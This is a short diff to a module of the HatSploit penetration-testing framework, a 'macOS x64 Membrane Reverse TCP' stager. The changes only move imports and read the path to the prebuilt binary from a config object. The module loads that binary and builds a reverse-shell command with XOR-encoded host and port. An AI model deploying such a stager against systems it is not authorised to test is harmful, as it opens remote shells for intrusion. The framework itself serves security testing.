@@ -5,11 +5,12 @@
 # Current source: https://github.com/EntySec/HatSploit
 #
 
-from hatsploit.payload import Payload
+from hatsploit.base.payload import Payload
+from hatsploit.base.config import Config
 from hatsploit.utils.string import StringTools
 from hatsploit.utils.tcp import TCPClient
 
-from hatsploit.session import Session
+from hatsploit.base.session import Session
 from hatsploit.utils.telnet import TelnetClient
 
 
@@ -38,6 +39,8 @@ class HatSploitSession(Session, TelnetClient):
 
 
 class HatSploitPayload(Payload, StringTools, TCPClient):
+    config = Config()
+
     details = {
         'Category': "stager",
         'Name': "macOS x64 Membrane Reverse TCP",
@@ -77,7 +80,7 @@ class HatSploitPayload(Payload, StringTools, TCPClient):
         local_port = self.xor_string(local_port)
 
         self.output_process("Generating payload...")
-        with open(self.data_path + 'membrane/macos/x64/membrane', 'rb') as f:
+        with open(f"{self.config.path_config['data_path']}membrane/macos/x64/membrane", 'rb') as f:
             payload = f.read()
 
         return payload, f"reverse '{local_host}' '{local_port}'", HatSploitSession
